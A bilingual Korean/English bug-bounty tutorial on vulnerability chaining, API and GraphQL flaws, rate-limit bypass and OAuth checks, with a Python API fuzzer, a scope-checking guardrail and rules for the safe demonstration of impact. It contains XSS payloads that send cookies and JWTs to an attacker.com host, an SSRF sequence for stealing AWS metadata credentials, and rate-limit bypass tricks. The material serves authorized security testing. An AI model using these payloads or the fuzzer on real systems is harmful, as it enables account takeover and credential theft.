> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 고급 버그바운티 기법: 취약점 체이닝과 API 퍼징

## 취약점 체이닝이란?

단일 취약점으로는 "Low" 혹은 "Informational" 수준에 그치는 버그들을 조합하면 "Critical"이 되는 경우가 있습니다. 이것이 **취약점 체이닝(Vulnerability Chaining)**입니다.

예를 들어:
- **SSRF + RCE**: SSRF로 내부 메타데이터 서버에 접근 → AWS 자격증명 탈취 → 전체 인프라 장악
- **XSS + CSRF**: XSS로 CSRF 토큰을 훔쳐 → 피해자 계정에서 임의 행동 수행
- **IDOR + PII 노출**: IDOR로 다른 사용자 프로필 접근 → 전화번호, 주민번호 수집
- **Open Redirect + Phishing**: 신뢰할 수 있는 도메인의 Open Redirect → 피싱 공격에 활용

---

## 대표적인 체이닝 패턴

### 패턴 1: SSRF → AWS 자격증명 탈취 → RCE

```
1. SSRF 취약점 발견: /fetch?url=<공격자 제어 URL>
2. 내부 메타데이터 서버 접근:
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. 역할 이름 확인 후 자격증명 요청:
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role
4. 응답에서 AccessKeyId, SecretAccessKey, Token 추출
5. 획득한 자격증명으로 AWS CLI 사용:
   aws s3 ls / aws ec2 describe-instances
```

### 패턴 2: XSS → 세션 탈취 → 계정 장악

```javascript
// XSS 페이로드로 세션 쿠키 전송
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie), {
  method: 'GET',
  mode: 'no-cors'
});
</script>

// 혹은 로컬스토리지의 JWT 탈취
<script>
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?t=' + encodeURIComponent(token));
</script>
```

### 패턴 3: OAuth 취약점 → 계정 탈취

OAuth 흐름에서 자주 발견되는 취약점들:
1. **State 파라미터 누락**: CSRF 공격으로 피해자 계정에 공격자 계정 연결
2. **Redirect URI 검증 불완전**: 공격자 서버로 인증 코드 전달
3. **코드 재사용 허용**: 훔친 authorization code 재사용 가능

---

## 비즈니스 로직 취약점 (Logic Bugs)

비즈니스 로직 오류는 자동화 스캐너가 거의 발견하지 못합니다. 이해력과 창의성이 필요합니다.

### 대표적인 예시

**가격 조작**:
```
정상: 상품 추가 → 수량 입력 → 결제
공격: 수량에 음수 입력 (-1) → 환불 금액 발생 → 계좌 잔액 증가
     OR: 쿠폰 중복 사용 → 가격 0원 또는 음수로 만들기
```

**경쟁 조건 (Race Condition)**:
```
정상: 쿠폰 사용 → DB에 사용 표시 → 다음 요청 거부
공격: 쿠폰 사용 요청을 동시에 50개 보내기 → 타이밍 창에서 여러 번 사용
```

**상태 기계 우회**:
```
정상 흐름: 미인증 → 이메일 확인 → 비밀번호 재설정 → 완료
공격:      단계 1의 토큰을 저장해 두고 비밀번호 변경 후에도 사용
```

---

## API 버그바운티: GraphQL, REST 취약점

### GraphQL 취약점

GraphQL은 클라이언트가 원하는 데이터를 직접 요청하는 구조여서 독특한 취약점이 발생합니다.

```graphql
# 인트로스펙션 쿼리 (스키마 정보 노출)
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# 과도한 정보 요청 (IDOR)
{
  user(id: 2) {
    email
    phone
    creditCards {
      number
      cvv
    }
  }
}

# 배치 공격 (Rate Limit 우회)
[
  {"query": "query { user(email: \"a@a.com\") { passwordHash } }"},
  {"query": "query { user(email: \"b@b.com\") { passwordHash } }"},
  ...
]
```

### REST API 일반 취약점

```
# IDOR (Insecure Direct Object Reference)
GET /api/v1/invoice/1001  → 내 청구서
GET /api/v1/invoice/1000  → 다른 사람 청구서 (접근 가능하면 IDOR)

# Mass Assignment
POST /api/v1/users
{"name": "Alice", "role": "user"}
→ 시도: {"name": "Alice", "role": "admin", "credit": 99999}

# HTTP 메서드 허용 범위
OPTIONS /api/v1/admin  → Allow: GET, POST, PUT, DELETE
→ PUT/DELETE 요청으로 관리자 데이터 수정 시도
```

---

## Rate Limiting 우회 기법

```
# 헤더 조작
X-Forwarded-For: 1.2.3.<순서대로 증가>
X-Real-IP: 다른 IP
X-Originating-IP: 다른 IP

# 경로 변형
/api/v1/login   → 제한 있음
/API/V1/Login   → 우회 (대소문자)
/api/v1/login/  → 우회 (슬래시)
/api/v1/../v1/login → 우회 (경로 정규화)

# 파라미터 변형
username=admin        → 제한 있음
username=admin%20     → 우회 (공백 인코딩)
username=ADMIN        → 우회 (대문자)
```

---

## Python으로 API 퍼징 자동화

```python
#!/usr/bin/env python3
"""
api_fuzzer.py — API 엔드포인트 자동 퍼징 도구

사용법:
    python api_fuzzer.py -u https://example.com/api/v1 -w wordlist.txt
    python api_fuzzer.py -u https://api.example.com -m POST --data '{"key":"FUZZ"}'
    python api_fuzzer.py -u https://example.com/api/user/FUZZ --range 1-1000

주의: 반드시 테스트 허가를 받은 시스템에서만 사용하세요.
"""

from __future__ import annotations

import argparse
import json
import logging
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger(__name__)

FUZZ_MARKER = "FUZZ"


@dataclass
class FuzzResult:
    payload: str
    url: str
    status_code: int
    content_length: int
    response_time_ms: float
    interesting: bool = False
    reason: str = ""


@dataclass
class FuzzConfig:
    base_url: str
    method: str = "GET"
    headers: dict[str, str] = field(default_factory=dict)
    data_template: str = ""          # POST 바디 템플릿, FUZZ 포함
    timeout: int = 10
    delay: float = 0.1              # 요청 간 지연 (초)
    threads: int = 5
    filter_codes: set[int] = field(default_factory=lambda: {404})
    interesting_codes: set[int] = field(default_factory=lambda: {200, 201, 301, 302, 401, 403, 500})


def generate_payloads_from_file(wordlist_path: Path) -> list[str]:
    """워드리스트 파일에서 페이로드를 읽습니다."""
    if not wordlist_path.exists():
        raise FileNotFoundError(f"워드리스트 없음: {wordlist_path}")
    return [
        line.strip()
        for line in wordlist_path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if line.strip() and not line.startswith("#")
    ]


def generate_numeric_payloads(range_str: str) -> list[str]:
    """
    숫자 범위에서 페이로드를 생성합니다.

    Args:
        range_str: "1-1000" 형식의 범위 문자열

    Returns:
        숫자 문자열 목록
    """
    try:
        start_s, end_s = range_str.split("-")
        start, end = int(start_s), int(end_s)
        if end - start > 100_000:
            raise ValueError("범위가 너무 큽니다 (최대 100,000)")
        return [str(i) for i in range(start, end + 1)]
    except ValueError as exc:
        raise ValueError(f"잘못된 범위 형식 '{range_str}': {exc}") from exc


def apply_payload(template: str, payload: str) -> str:
    """템플릿의 FUZZ 마커를 페이로드로 치환합니다."""
    return template.replace(FUZZ_MARKER, urllib.parse.quote(payload, safe=""))


def send_request(
    url: str,
    config: FuzzConfig,
    payload: str,
) -> FuzzResult | None:
    """
    단일 퍼즈 요청을 보내고 결과를 반환합니다.

    Args:
        url: 요청 URL (FUZZ가 치환된 후)
        config: 퍼즈 설정
        payload: 현재 페이로드 문자열

    Returns:
        FuzzResult 또는 오류 시 None
    """
    body: bytes | None = None
    if config.data_template and config.method in ("POST", "PUT", "PATCH"):
        body = apply_payload(config.data_template, payload).encode("utf-8")

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; FuzzBot/1.0)",
        **config.headers,
    }
    if body:
        headers.setdefault("Content-Type", "application/json")

    req = urllib.request.Request(
        url=url,
        data=body,
        headers=headers,
        method=config.method,
    )

    start = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=config.timeout) as resp:
            content = resp.read()
            elapsed_ms = (time.monotonic() - start) * 1000
            return FuzzResult(
                payload=payload,
                url=url,
                status_code=resp.status,
                content_length=len(content),
                response_time_ms=round(elapsed_ms, 1),
            )
    except urllib.error.HTTPError as exc:
        elapsed_ms = (time.monotonic() - start) * 1000
        try:
            content = exc.read()
        except Exception:
            content = b""
        return FuzzResult(
            payload=payload,
            url=url,
            status_code=exc.code,
            content_length=len(content),
            response_time_ms=round(elapsed_ms, 1),
        )
    except Exception as exc:
        log.debug("요청 실패 [%s]: %s", payload, exc)
        return None


def analyze_result(
    result: FuzzResult,
    config: FuzzConfig,
    baseline_length: int,
) -> None:
    """결과를 분석하여 interesting 여부를 판단합니다."""
    # 필터링된 코드는 건너뜀
    if result.status_code in config.filter_codes:
        return

    reasons: list[str] = []

    # 흥미로운 상태 코드
    if result.status_code in config.interesting_codes:
        reasons.append(f"상태코드={result.status_code}")

    # 응답 크기가 기준치와 크게 다른 경우
    if baseline_length > 0:
        diff_ratio = abs(result.content_length - baseline_length) / max(baseline_length, 1)
        if diff_ratio > 0.3:  # 30% 이상 차이
            reasons.append(f"크기차이={result.content_length}vs{baseline_length}")

    # 응답 시간이 매우 긴 경우 (SQL Injection 징후)
    if result.response_time_ms > 5000:
        reasons.append(f"지연={result.response_time_ms:.0f}ms")

    if reasons:
        result.interesting = True
        result.reason = ", ".join(reasons)


def run_fuzzer(
    payloads: list[str],
    config: FuzzConfig,
) -> list[FuzzResult]:
    """
    전체 퍼징 캠페인을 실행합니다.

    Args:
        payloads: 페이로드 목록
        config: 퍼즈 설정

    Returns:
        흥미로운 결과 목록
    """
    # 기준선 요청 (빈 페이로드로)
    baseline_url = apply_payload(config.base_url, "baseline_test_xyz")
    baseline_result = send_request(baseline_url, config, "baseline")
    baseline_length = baseline_result.content_length if baseline_result else 0
    log.info("기준선 응답 크기: %d bytes", baseline_length)

    interesting_results: list[FuzzResult] = []
    total = len(payloads)

    def fuzz_one(payload: str) -> FuzzResult | None:
        url = apply_payload(config.base_url, payload)
        result = send_request(url, config, payload)
        if result:
            analyze_result(result, config, baseline_length)
        if config.delay > 0:
            time.sleep(config.delay)
        return result

    log.info("퍼징 시작: %d개 페이로드, %d 스레드", total, config.threads)

    with ThreadPoolExecutor(max_workers=config.threads) as executor:
        futures = {executor.submit(fuzz_one, p): p for p in payloads}
        done_count = 0
        for future in as_completed(futures):
            done_count += 1
            result = future.result()
            if result and result.interesting:
                interesting_results.append(result)
                log.info(
                    "[발견!] %s | 코드:%d | 크기:%d | %s",
                    result.payload, result.status_code,
                    result.content_length, result.reason,
                )
            if done_count % 100 == 0:
                log.info("진행: %d/%d (발견: %d)", done_count, total, len(interesting_results))

    return interesting_results


def save_results(results: list[FuzzResult], output_path: Path) -> None:
    """결과를 JSON 파일로 저장합니다."""
    data = [
        {
            "payload": r.payload,
            "url": r.url,
            "status_code": r.status_code,
            "content_length": r.content_length,
            "response_time_ms": r.response_time_ms,
            "reason": r.reason,
        }
        for r in results
    ]
    output_path.write_text(json.dumps(data, indent=2, ensure_ascii=False))


def main() -> None:
    parser = argparse.ArgumentParser(
        description="API 엔드포인트 자동 퍼징",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
예시:
  python api_fuzzer.py -u https://example.com/api/FUZZ -w /usr/share/wordlists/common.txt
  python api_fuzzer.py -u https://example.com/api/user/FUZZ --range 1-500
  python api_fuzzer.py -u https://example.com/api -m POST --data '{{"id":"FUZZ"}}'

주의: {FUZZ_MARKER} 마커가 URL 또는 데이터에 포함되어야 합니다.
        """,
    )
    parser.add_argument("-u", "--url", required=True,
                        help=f"대상 URL (FUZZ 마커 포함, 예: https://example.com/api/FUZZ)")
    parser.add_argument("-w", "--wordlist", help="워드리스트 파일 경로")
    parser.add_argument("--range", dest="num_range",
                        help="숫자 범위 (예: 1-1000)")
    parser.add_argument("-m", "--method", default="GET",
                        choices=["GET", "POST", "PUT", "PATCH", "DELETE"])
    parser.add_argument("--data", default="", help="POST 요청 본문 템플릿 (FUZZ 포함)")
    parser.add_argument("-H", "--header", action="append", dest="headers", default=[],
                        help="추가 헤더 (예: 'Authorization: Bearer token')")
    parser.add_argument("-t", "--threads", type=int, default=5)
    parser.add_argument("-d", "--delay", type=float, default=0.1,
                        help="요청 간 지연 (초, 기본: 0.1)")
    parser.add_argument("-o", "--output", default="fuzz_results.json")
    args = parser.parse_args()

    if FUZZ_MARKER not in args.url and FUZZ_MARKER not in args.data:
        parser.error(f"URL 또는 --data에 {FUZZ_MARKER} 마커가 필요합니다.")

    # 페이로드 생성
    payloads: list[str] = []
    if args.wordlist:
        payloads.extend(generate_payloads_from_file(Path(args.wordlist)))
    if args.num_range:
        payloads.extend(generate_numeric_payloads(args.num_range))

    if not payloads:
        parser.error("--wordlist 또는 --range 중 하나를 지정해야 합니다.")

    # 헤더 파싱
    extra_headers: dict[str, str] = {}
    for h in args.headers:
        if ":" in h:
            key, _, value = h.partition(":")
            extra_headers[key.strip()] = value.strip()

    config = FuzzConfig(
        base_url=args.url,
        method=args.method,
        headers=extra_headers,
        data_template=args.data,
        threads=args.threads,
        delay=args.delay,
    )

    results = run_fuzzer(payloads, config)

    if results:
        output_path = Path(args.output)
        save_results(results, output_path)
        print(f"\n흥미로운 결과: {len(results)}개 → {output_path.absolute()}")
    else:
        print("\n흥미로운 결과 없음")

    print(f"전체 페이로드 수: {len(payloads)}")


if __name__ == "__main__":
    main()
```

---

## OAuth 취약점 패턴 체크리스트

```
[ ] state 파라미터가 없거나 고정값인가?
[ ] redirect_uri가 완전히 일치하는지 검증하는가?
[ ] authorization code가 한 번만 사용 가능한가?
[ ] access token이 로그에 기록되는가?
[ ] implicit flow가 사용되는가? (보안 취약)
[ ] PKCE가 모바일 앱에 적용되어 있는가?
[ ] 토큰 만료가 적절히 설정되어 있는가?
```

---

## 스코프 경계 강제 — 요청을 보내기 전에 인가 범위 검증

버그바운티 자동화의 가장 흔한 사고는 취약점 발견 실패가 아니라 **범위 밖 대상 타격**이다 — 와일드카드 스코프 오해, 서드파티 자산 포함, 인수합병으로 넘어온 호스트 등으로 자동화가 인가되지 않은 시스템에 요청을 보내면 프로그램 규칙 위반이자 법적 문제가 된다. 따라서 모든 대상 URL을 **요청 발사 전에** 프로그램 스코프(allow/deny 패턴)와 대조해 범위 밖을 차단하는 가드레일이 자동화의 첫 단계여야 한다.

```python
#!/usr/bin/env python3
"""버그바운티 자동화가 요청을 보내기 전에 대상 URL을 프로그램 스코프와 대조해
범위 밖 대상을 차단한다. 공격이 아니라 책임 있는 테스트 가드레일 — 인가 범위 강제."""
import fnmatch
from urllib.parse import urlparse


def in_scope(url: str, allow: list[str], deny: list[str]) -> dict:
    host = (urlparse(url).hostname or "").lower()
    if not host:
        return {"url": url, "allowed": False, "reason": "unparseable_host"}
    denied = any(fnmatch.fnmatch(host, pat.lower()) for pat in deny)
    allowed = any(fnmatch.fnmatch(host, pat.lower()) for pat in allow)
    if denied:
        reason = "explicit_deny"
    elif not allowed:
        reason = "not_in_allowlist"
    else:
        reason = "in_scope"
    return {"url": url, "host": host, "allowed": allowed and not denied, "reason": reason}


def filter_targets(urls: list[str], allow: list[str], deny: list[str]) -> tuple[list, list]:
    verdicts = [in_scope(u, allow, deny) for u in urls]
    return ([v["url"] for v in verdicts if v["allowed"]],
            [v for v in verdicts if not v["allowed"]])
```

| 신호 | 설명 | 오탐/보정 요인 |
|------|------|----------------|
| deny 패턴 매칭 | 명시적 범위 밖 — 즉시 차단 | 상위 도메인 deny가 인가 서브도메인을 과차단할 수 있음 |
| allowlist 미매칭 | 스코프 근거 없음 — 기본 거부 | 신규 인가 자산 등록 지연 시 정당 대상도 걸림 |
| 파싱 불가 호스트 | 대상 정의 오류 | 리다이렉트 후 최종 호스트로 재검증 필요 |

**탐지/방어**: 스코프 검증은 자동화의 **차단형 첫 게이트**(기본 거부)로 두고, 리다이렉트·와일드카드는 최종 도착 호스트로 재평가한다. allow/deny 목록은 프로그램 정책 원문에서 파생하고 변경 이력을 남겨 인가 근거를 감사 가능하게 한다([[10_Pentest_Methodology]]). 모든 테스트는 **명시적으로 인가된 범위** 안에서만.

---

<!-- safety-validate-73 -->
## 체이닝의 영향 시연 한계와 안전

취약점 체이닝은 영향을 키워 보상을 높이지만, **"증명"과 "실제 피해" 사이 선을 넘으면 위반**이 됩니다. 강력할수록 더 신중한 안전 기준이 필요합니다.

| 상황 | 위험 | 안전 기준 |
|---|---|---|
| RCE 도달 | 실제 명령 실행으로 시스템 손상 | `id`/무해한 마커까지만, 그 이상은 사전 허가 |
| 데이터 접근 체인 | 타 사용자 실데이터 노출 | 자기 계정 2개로 cross-account 증명 |
| 측면이동 | OOS 자산으로 확산 | 범위 경계에서 멈춤 |
| 지속성 | 백도어·실서비스 변경 | 설치 금지, 흔적 남기지 않음 |

### 체이닝 안전 검증 (직접)

```text
딥 다이브 전 확인:
  □ 다음 단계가 여전히 in-scope인가?
  □ '증명'에 필요한 최소 행위인가? (그 이상은 정책 허가 후)
  □ 실제 사용자/데이터에 피해가 없는가?
  □ 종료 후 만든 아티팩트를 정리(또는 보고)했는가?
```

> 핵심: 체이닝의 목표는 **"영향을 안전하게 시연"**하는 것이지 침해를 완성하는 것이 아닙니다. RCE면 무해한 명령으로, 데이터 접근이면 자기 계정 간 증명으로 멈춥니다. 더 깊이 가야 한다면 진행 전에 프로그램의 명시적 허가를 받으세요([[68_Purple_Team]]).

**최신 기법·통제 (2025–2026):**
- 인증/인가 로직·비즈니스로직·레이스컨디션 등 자동화가 놓치는 결함이 고보상 — 수동 심층분석 필요. 검증: 체인 익스플로잇이 재현 가능한가
- API·GraphQL·SSRF 체인 등 최신 벡터 — 실제 영향이 안전하게 실증되는지 확인([[52_API_Security]])

---

<a name="english"></a>

# Advanced Bug Bounty Techniques: Chaining Vulnerabilities and API Fuzzing

## What Is Vulnerability Chaining?

Individual vulnerabilities that would score "Low" or "Informational" can combine into "Critical" findings. This is **vulnerability chaining**.

Examples:
- **SSRF + RCE**: SSRF accesses internal metadata server → steal AWS credentials → control entire infrastructure
- **XSS + CSRF**: XSS steals CSRF token → perform arbitrary actions in victim's account
- **IDOR + PII Leak**: IDOR accesses other users' profiles → collect phone numbers, SSNs
- **Open Redirect + Phishing**: Trusted domain's open redirect → weaponized for phishing campaigns

---

## Common Chaining Patterns

### Pattern 1: SSRF → AWS Credential Theft → RCE

```
1. Find SSRF: /fetch?url=<attacker-controlled URL>
2. Access internal metadata server:
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Get role name, then request credentials:
   GET /fetch?url=http://169.254.169.254/.../EC2Role
4. Extract AccessKeyId, SecretAccessKey, Token from response
5. Use credentials with AWS CLI:
   aws s3 ls / aws ec2 describe-instances
```

### Pattern 2: XSS → Session Hijacking → Account Takeover

```javascript
// Steal session cookie via XSS
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie), {
  method: 'GET',
  mode: 'no-cors'
});
</script>

// Steal JWT from localStorage
<script>
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?t=' + encodeURIComponent(token));
</script>
```

---

## Business Logic Vulnerabilities

Logic bugs are nearly invisible to automated scanners. They require deep understanding of how the application is supposed to work.

### Examples

**Price Manipulation**:
```
Normal flow: Add item → Set quantity → Checkout
Attack:      Set quantity to -1 → Negative charge → Account balance increases
             OR: Apply same coupon multiple times → Reduce price to zero or negative
```

**Race Condition**:
```
Normal: Use coupon → Mark as used in DB → Reject next request
Attack: Send 50 simultaneous requests → Multiple usage within the timing window
```

**State Machine Bypass**:
```
Normal flow: Unauthenticated → Verify email → Reset password → Done
Attack:      Save the step-1 token and reuse it after password change
```

---

## API Bug Bounty: GraphQL and REST Vulnerabilities

### GraphQL Issues

```graphql
# Introspection query — leaks full schema
{
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}

# Excessive data request (IDOR)
{
  user(id: 2) {
    email
    phone
    creditCards { number cvv }
  }
}

# Batching attack to bypass rate limits
[
  {"query": "query { user(email: \"a@a.com\") { passwordHash } }"},
  {"query": "query { user(email: \"b@b.com\") { passwordHash } }"}
]
```

### REST API Common Vulnerabilities

```
# IDOR
GET /api/v1/invoice/1001  → My invoice
GET /api/v1/invoice/1000  → Someone else's invoice (IDOR if accessible)

# Mass Assignment
POST /api/v1/users
{"name": "Alice", "role": "user"}
Try: {"name": "Alice", "role": "admin", "credit": 99999}

# Unexpected HTTP method handling
OPTIONS /api/v1/admin  → Allow: GET, POST, PUT, DELETE
Try PUT/DELETE to modify admin data
```

---

## Rate Limiting Bypass Techniques

```
# Header manipulation
X-Forwarded-For: 1.2.3.<incrementing>
X-Real-IP: spoofed IP

# Path variation
/api/v1/login     → limited
/API/V1/Login     → bypass (case difference)
/api/v1/login/    → bypass (trailing slash)

# Parameter variation
username=admin        → limited
username=admin%20     → bypass (URL-encoded space)
username=ADMIN        → bypass (uppercase)
```

---

## API Fuzzer Usage

The full `api_fuzzer.py` implementation in the Korean section above is the canonical version. It provides:

- `FUZZ` marker substitution in both URL paths and POST body templates
- Wordlist-based fuzzing (`-w /path/to/wordlist.txt`)
- Numeric range fuzzing for IDOR testing (`--range 1-1000`)
- Parallel execution with configurable thread count
- Baseline response comparison to detect size anomalies
- Response time detection (useful for time-based blind SQLi)
- JSON output of all interesting findings

```bash
# Fuzz API endpoint paths
python api_fuzzer.py -u https://example.com/api/FUZZ -w common_endpoints.txt

# IDOR test across numeric IDs
python api_fuzzer.py -u https://example.com/api/orders/FUZZ --range 1-500 -t 10

# POST body fuzzing
python api_fuzzer.py \
  -u https://example.com/api/users \
  -m POST \
  --data '{"role":"FUZZ"}' \
  -w roles.txt \
  -H "Authorization: Bearer YOUR_TOKEN"
```

---

## OAuth Vulnerability Checklist

```
[ ] Is the state parameter missing or using a fixed value? (→ CSRF)
[ ] Does redirect_uri validation use exact matching?
[ ] Can an authorization code be reused more than once?
[ ] Are access tokens being logged anywhere?
[ ] Is the implicit flow still in use? (deprecated, insecure)
[ ] Is PKCE enforced for mobile apps?
[ ] Are token expiration times set appropriately?
```

---

## Reference Links

- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- PortSwigger OAuth labs: https://portswigger.net/web-security/oauth

## Scope Boundary Enforcement — Validate Authorization Before Firing Requests

The most common bug-bounty accident is not a missed vulnerability but **hitting an out-of-scope target** — misread wildcard scope, included third-party assets, or hosts inherited via acquisition can cause automation to send requests to unauthorized systems, which is both a program-rule violation and a legal problem. So a guardrail that checks every target URL against program scope (allow/deny patterns) **before firing a request** must be the first step of automation.

```python
#!/usr/bin/env python3
"""Before bug-bounty automation sends a request, check the target URL against the
program scope and block out-of-scope targets. Not an attack but a responsible-testing
guardrail — enforcing the authorized scope."""
import fnmatch
from urllib.parse import urlparse


def in_scope(url: str, allow: list[str], deny: list[str]) -> dict:
    host = (urlparse(url).hostname or "").lower()
    if not host:
        return {"url": url, "allowed": False, "reason": "unparseable_host"}
    denied = any(fnmatch.fnmatch(host, pat.lower()) for pat in deny)
    allowed = any(fnmatch.fnmatch(host, pat.lower()) for pat in allow)
    if denied:
        reason = "explicit_deny"
    elif not allowed:
        reason = "not_in_allowlist"
    else:
        reason = "in_scope"
    return {"url": url, "host": host, "allowed": allowed and not denied, "reason": reason}


def filter_targets(urls: list[str], allow: list[str], deny: list[str]) -> tuple[list, list]:
    verdicts = [in_scope(u, allow, deny) for u in urls]
    return ([v["url"] for v in verdicts if v["allowed"]],
            [v for v in verdicts if not v["allowed"]])
```

| Signal | Meaning | False-positive / adjustment factor |
|--------|---------|-------------------------------------|
| Deny-pattern match | Explicitly out of scope — block immediately | A parent-domain deny may over-block an authorized subdomain |
| No allowlist match | No basis for scope — default deny | Delayed registration of new authorized assets can catch legit targets |
| Unparseable host | Malformed target definition | Re-validate against the final host after redirects |

**Detection/defense**: Make scope validation the automation's **blocking first gate** (default deny), and re-evaluate redirects/wildcards against the final destination host. Derive allow/deny lists from the program policy text and keep a change history so the authorization basis is auditable ([[10_Pentest_Methodology]]). All testing stays strictly within the **explicitly authorized scope**.

---

## Limits and Safety of Demonstrating Impact via Chaining

Vulnerability chaining raises impact (and reward), but **crossing the line from "proof" to "real harm" becomes a violation**. The more powerful the chain, the more careful the safety bar must be.

| Situation | Risk | Safety bar |
|---|---|---|
| Reaching RCE | Real command execution damages the system | Stop at `id`/a harmless marker; beyond that needs prior approval |
| Data-access chain | Exposing other users' real data | Prove cross-account with two of your own accounts |
| Lateral movement | Spreading to OOS assets | Stop at the scope boundary |
| Persistence | Backdoors/changes to live service | Do not install; leave no traces |

### Chaining safety validation (do it yourself)

```text
Before going deeper, confirm:
  [ ] Is the next step still in scope?
  [ ] Is it the minimum action needed for 'proof'? (more needs policy approval)
  [ ] No harm to real users/data?
  [ ] Cleaned up (or reported) any artifacts you created?
```

> Core: the goal of chaining is to **demonstrate impact safely**, not to complete a breach. For RCE, stop at a harmless command; for data access, prove between your own accounts. If you must go deeper, get the program's explicit approval first (see [[68_Purple_Team]]).
